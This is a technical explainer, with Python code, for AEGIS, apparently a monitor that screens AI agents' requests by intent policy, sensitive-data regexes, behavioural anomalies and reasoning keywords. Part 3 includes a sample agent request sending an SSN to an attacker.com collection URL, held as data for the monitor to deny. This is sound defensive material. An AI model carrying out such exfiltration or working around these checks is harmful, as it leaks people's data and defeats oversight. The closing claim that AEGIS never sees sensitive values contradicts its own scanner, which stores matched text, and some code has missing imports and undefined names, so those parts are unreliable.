# Intent Pattern & Format Detection: Technical Deep Dive

## How AEGIS Detects Threats (Real Implementation)

This document explains the **actual code-level implementation** of how AEGIS detects intent patterns and sensitive data formats.

---

## 🎯 Part 1: Intent Pattern Detection

### What is an Intent?

An **intent** is what an AI agent wants to do. Examples:
- `READ_CUSTOMER_DATA`
- `SEND_EMAIL`
- `MODIFY_DATABASE`
- `SEND_EXTERNAL_REQUEST`

### How Intent Patterns Are Defined

Intents are defined in a **policy file** (YAML format):

```yaml
# intents.yaml
intents:
  - name: "READ_CUSTOMER_DATA"
    allowed: true
    required_level: 3
    reason: "Reading customer data is permitted for support agents"
    
  - name: "SEND_EXTERNAL_REQUEST"
    allowed: false
    required_level: 10
    reason: "External data transmission is prohibited"
    
  - name: "MODIFY_PRODUCTION_CONFIG"
    allowed: true
    required_level: 8
    reason: "Only admin-level agents can modify production"
```

### How Intent Matching Works (Code)

**Step 1: Agent sends request**
```python
# What the AI agent sends to AEGIS
request = {
    "agent_id": "customer-bot-01",
    "intent": "SEND_EXTERNAL_REQUEST",
    "target": "https://analytics.example.com",
    "reasoning": "Sending usage analytics"
}
```

**Step 2: AEGIS loads policy**
```python
# policy_evaluator.py
import yaml

class PolicyEvaluator:
    def __init__(self, policy_file="intents.yaml"):
        with open(policy_file, 'r') as f:
            self.policy = yaml.safe_load(f)
        self.intents = {i['name']: i for i in self.policy['intents']}
    
    def evaluate(self, agent_id, intent_name, agent_level):
        # Step 1: Find the intent in policy
        if intent_name not in self.intents:
            return {
                "decision": "DENY",
                "reason": f"Unknown intent: {intent_name}"
            }
        
        intent_policy = self.intents[intent_name]
        
        # Step 2: Check if intent is allowed at all
        if not intent_policy['allowed']:
            return {
                "decision": "DENY",
                "reason": intent_policy['reason']
            }
        
        # Step 3: Check agent's access level
        if agent_level < intent_policy['required_level']:
            return {
                "decision": "DENY",
                "reason": f"Insufficient access level. Required: {intent_policy['required_level']}, Agent has: {agent_level}"
            }
        
        # All checks passed
        return {
            "decision": "ALLOW",
            "reason": intent_policy['reason']
        }
```

**Step 3: Pattern matching in action**
```python
# Example usage
evaluator = PolicyEvaluator()

# Agent with level 3 tries to send external request
result = evaluator.evaluate(
    agent_id="customer-bot-01",
    intent_name="SEND_EXTERNAL_REQUEST",
    agent_level=3
)

print(result)
# Output: {
#   "decision": "DENY",
#   "reason": "External data transmission is prohibited"
# }
```

### Advanced Pattern Matching: Wildcards and Regex

```python
class AdvancedPolicyEvaluator:
    def __init__(self):
        self.patterns = [
            {
                "pattern": r"^SEND_.*",  # Matches any SEND_* intent
                "allowed": False,
                "reason": "All sending operations require review"
            },
            {
                "pattern": r"^READ_.*",  # Matches any READ_* intent
                "allowed": True,
                "reason": "Read operations are generally safe"
            },
            {
                "pattern": r".*_PRODUCTION_.*",  # Matches anything with PRODUCTION
                "allowed": False,
                "reason": "Production modifications require manual approval"
            }
        ]
    
    def matches_pattern(self, intent_name):
        import re
        for pattern_rule in self.patterns:
            if re.match(pattern_rule['pattern'], intent_name):
                return pattern_rule
        return None
```

---

## 🔍 Part 2: Sensitive Data Format Detection

### What Formats Are Detected?

AEGIS detects patterns that **look like** sensitive data:
- Email addresses
- Social Security Numbers (SSN)
- Credit card numbers
- API keys
- Phone numbers
- IP addresses

### How Format Detection Works (Code)

**Step 1: Define regex patterns**
```python
# dlp_scanner.py
import re

class DLPScanner:
    def __init__(self):
        self.patterns = {
            'email': {
                'regex': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                'severity': 'MEDIUM',
                'description': 'Email address detected'
            },
            'ssn': {
                'regex': r'\b\d{3}-\d{2}-\d{4}\b',
                'severity': 'CRITICAL',
                'description': 'Social Security Number pattern detected'
            },
            'credit_card': {
                'regex': r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',
                'severity': 'CRITICAL',
                'description': 'Credit card number pattern detected'
            },
            'api_key': {
                'regex': r'\b[A-Z0-9]{32,}\b',
                'severity': 'HIGH',
                'description': 'API key pattern detected'
            },
            'phone': {
                'regex': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
                'severity': 'MEDIUM',
                'description': 'Phone number detected'
            },
            'ip_address': {
                'regex': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
                'severity': 'LOW',
                'description': 'IP address detected'
            }
        }
    
    def scan(self, text):
        """Scan text for sensitive data patterns"""
        findings = []
        
        for pattern_name, pattern_info in self.patterns.items():
            matches = re.finditer(pattern_info['regex'], text)
            for match in matches:
                findings.append({
                    'type': pattern_name,
                    'severity': pattern_info['severity'],
                    'description': pattern_info['description'],
                    'position': match.span(),
                    'matched_text': match.group(),  # For logging only
                    'redacted': self._redact(match.group())
                })
        
        return findings
    
    def _redact(self, text):
        """Redact sensitive data for logging"""
        if len(text) <= 4:
            return '***'
        return text[:2] + '*' * (len(text) - 4) + text[-2:]
```

**Step 2: Scan data before transmission**
```python
# Example: Agent wants to send email
agent_request = {
    "intent": "SEND_EMAIL",
    "recipient": "customer@example.com",
    "body": "Your account number is 1234-5678-9012-3456 and SSN is 123-45-6789"
}

# AEGIS scans the email body
scanner = DLPScanner()
findings = scanner.scan(agent_request['body'])

print(findings)
# Output: [
#   {
#     'type': 'credit_card',
#     'severity': 'CRITICAL',
#     'description': 'Credit card number pattern detected',
#     'position': (26, 45),
#     'matched_text': '1234-5678-9012-3456',
#     'redacted': '12***************56'
#   },
#   {
#     'type': 'ssn',
#     'severity': 'CRITICAL',
#     'description': 'Social Security Number pattern detected',
#     'position': (57, 68),
#     'matched_text': '123-45-6789',
#     'redacted': '12*******89'
#   }
# ]
```

**Step 3: Make decision based on findings**
```python
def evaluate_with_dlp(intent, data, agent_level):
    # First check intent pattern
    policy_result = evaluator.evaluate(agent_id, intent, agent_level)
    
    if policy_result['decision'] == 'DENY':
        return policy_result
    
    # Intent is allowed, now check for sensitive data
    scanner = DLPScanner()
    findings = scanner.scan(data)
    
    # Check if any CRITICAL findings
    critical_findings = [f for f in findings if f['severity'] == 'CRITICAL']
    
    if critical_findings:
        return {
            "decision": "DENY",
            "reason": f"Attempted to transmit sensitive data: {', '.join([f['type'] for f in critical_findings])}",
            "findings": findings
        }
    
    return {
        "decision": "ALLOW",
        "reason": "No sensitive data detected",
        "findings": findings  # Log even if allowed
    }
```

---

## 🧪 Part 3: Real-World Detection Example

### Complete Flow: Agent Tries to Exfiltrate Data

```python
# Step 1: Agent makes request
agent_request = {
    "agent_id": "support-bot-01",
    "intent": "SEND_EXTERNAL_REQUEST",
    "url": "https://attacker.com/collect",
    "data": {
        "customer_email": "john@example.com",
        "ssn": "123-45-6789",
        "notes": "Customer inquiry about billing"
    }
}

# Step 2: AEGIS evaluates
class AEGISEvaluator:
    def __init__(self):
        self.policy = PolicyEvaluator()
        self.dlp = DLPScanner()
        self.whitelist = ["analytics.company.com", "api.company.com"]
    
    def evaluate_request(self, request):
        agent_id = request['agent_id']
        
        # Get agent from database
        agent = db.get_agent(agent_id)
        
        # Check 1: Intent pattern
        intent_result = self.policy.evaluate(
            agent_id=agent_id,
            intent_name=request['intent'],
            agent_level=agent.level
        )
        
        if intent_result['decision'] == 'DENY':
            return self._create_denial(
                reason=intent_result['reason'],
                detection_method="Intent Pattern Matching"
            )
        
        # Check 2: URL whitelist (for external requests)
        if request['intent'] == 'SEND_EXTERNAL_REQUEST':
            url_domain = self._extract_domain(request['url'])
            if url_domain not in self.whitelist:
                return self._create_denial(
                    reason=f"Domain {url_domain} not in whitelist",
                    detection_method="URL Whitelist Check"
                )
        
        # Check 3: DLP scan
        data_str = json.dumps(request['data'])
        findings = self.dlp.scan(data_str)
        
        critical_findings = [f for f in findings if f['severity'] == 'CRITICAL']
        if critical_findings:
            return self._create_denial(
                reason=f"Sensitive data detected: {[f['type'] for f in critical_findings]}",
                detection_method="DLP Pattern Matching",
                evidence=findings
            )
        
        # All checks passed
        return {
            "decision": "ALLOW",
            "reason": "All security checks passed",
            "findings": findings
        }
    
    def _create_denial(self, reason, detection_method, evidence=None):
        return {
            "decision": "DENY",
            "reason": reason,
            "detection_method": detection_method,
            "evidence": evidence,
            "timestamp": time.time()
        }

# Step 3: Execute evaluation
aegis = AEGISEvaluator()
result = aegis.evaluate_request(agent_request)

print(result)
# Output: {
#   "decision": "DENY",
#   "reason": "External data transmission is prohibited",
#   "detection_method": "Intent Pattern Matching",
#   "evidence": None,
#   "timestamp": 1704484800.0
# }
```

---

## 🔐 Part 4: Advanced Detection Techniques

### 1. Behavioral Pattern Detection

```python
class BehavioralAnalyzer:
    def __init__(self):
        self.history = {}  # agent_id -> list of requests
    
    def analyze(self, agent_id, current_request):
        # Get agent's history
        if agent_id not in self.history:
            self.history[agent_id] = []
        
        history = self.history[agent_id]
        
        # Check 1: Frequency anomaly
        recent_requests = [r for r in history if r['timestamp'] > time.time() - 60]
        if len(recent_requests) > 100:  # More than 100 requests/minute
            return {
                "anomaly": True,
                "type": "FREQUENCY_SPIKE",
                "reason": f"Unusual request frequency: {len(recent_requests)}/min"
            }
        
        # Check 2: Intent pattern change
        recent_intents = [r['intent'] for r in recent_requests]
        if current_request['intent'] not in recent_intents and len(recent_intents) > 10:
            return {
                "anomaly": True,
                "type": "NEW_INTENT",
                "reason": f"First time using intent: {current_request['intent']}"
            }
        
        # Check 3: Retry after denial
        last_request = history[-1] if history else None
        if last_request and last_request.get('decision') == 'DENY':
            if last_request['intent'] == current_request['intent']:
                return {
                    "anomaly": True,
                    "type": "RETRY_AFTER_DENIAL",
                    "reason": "Attempting same action after denial"
                }
        
        # No anomalies
        return {"anomaly": False}
```

### 2. Reasoning Chain Validation

```python
class ReasoningValidator:
    def validate(self, intent, reasoning, agent_purpose):
        """Check if reasoning makes sense for the intent"""
        
        # Define expected reasoning patterns
        valid_patterns = {
            "READ_CUSTOMER_DATA": ["support", "inquiry", "ticket", "help"],
            "SEND_EMAIL": ["respond", "notify", "inform", "update"],
            "MODIFY_DATABASE": ["update", "correct", "fix", "change"]
        }
        
        if intent not in valid_patterns:
            return {"valid": True}  # Unknown intent, skip validation
        
        # Check if reasoning contains expected keywords
        reasoning_lower = reasoning.lower()
        expected_keywords = valid_patterns[intent]
        
        has_valid_keyword = any(kw in reasoning_lower for kw in expected_keywords)
        
        if not has_valid_keyword:
            return {
                "valid": False,
                "reason": f"Reasoning '{reasoning}' doesn't match expected patterns for {intent}",
                "expected_keywords": expected_keywords
            }
        
        # Check for contradiction with agent purpose
        if agent_purpose and agent_purpose.lower() not in reasoning_lower:
            return {
                "valid": False,
                "reason": f"Reasoning doesn't align with agent purpose: {agent_purpose}"
            }
        
        return {"valid": True}
```

---

## 📊 Part 5: Complete Detection Pipeline

```python
class CompleteThreatDetectionPipeline:
    def __init__(self):
        self.policy = PolicyEvaluator()
        self.dlp = DLPScanner()
        self.behavioral = BehavioralAnalyzer()
        self.reasoning = ReasoningValidator()
    
    def evaluate(self, request):
        """Complete multi-layer threat detection"""
        
        results = {
            "layers": [],
            "final_decision": "ALLOW",
            "reasons": []
        }
        
        # Layer 1: Intent Pattern Matching
        intent_check = self.policy.evaluate(
            request['agent_id'],
            request['intent'],
            request['agent_level']
        )
        results['layers'].append({
            "layer": "Intent Pattern",
            "result": intent_check
        })
        if intent_check['decision'] == 'DENY':
            results['final_decision'] = 'DENY'
            results['reasons'].append(intent_check['reason'])
            return results
        
        # Layer 2: DLP Scanning
        if 'data' in request:
            dlp_findings = self.dlp.scan(json.dumps(request['data']))
            critical = [f for f in dlp_findings if f['severity'] == 'CRITICAL']
            results['layers'].append({
                "layer": "DLP Scan",
                "findings": dlp_findings
            })
            if critical:
                results['final_decision'] = 'DENY'
                results['reasons'].append(f"Sensitive data: {[f['type'] for f in critical]}")
                return results
        
        # Layer 3: Behavioral Analysis
        behavioral_check = self.behavioral.analyze(
            request['agent_id'],
            request
        )
        results['layers'].append({
            "layer": "Behavioral Analysis",
            "result": behavioral_check
        })
        if behavioral_check['anomaly']:
            results['final_decision'] = 'DENY'
            results['reasons'].append(behavioral_check['reason'])
            return results
        
        # Layer 4: Reasoning Validation
        if 'reasoning' in request:
            reasoning_check = self.reasoning.validate(
                request['intent'],
                request['reasoning'],
                request.get('agent_purpose')
            )
            results['layers'].append({
                "layer": "Reasoning Validation",
                "result": reasoning_check
            })
            if not reasoning_check['valid']:
                results['final_decision'] = 'DENY'
                results['reasons'].append(reasoning_check['reason'])
                return results
        
        # All layers passed
        results['reasons'].append("All security layers passed")
        return results
```

---

## 🎯 Summary: How Detection Actually Works

1. **Intent Pattern**: String matching against policy rules (YAML)
2. **Format Detection**: Regex patterns for sensitive data
3. **Behavioral Analysis**: Statistical anomaly detection
4. **Reasoning Validation**: Keyword and logic checking

**Key Point**: AEGIS never sees the actual sensitive data values - it only detects **patterns** and **formats** that look like sensitive data.

This is how AEGIS can protect AI agents without violating privacy! 🛡️
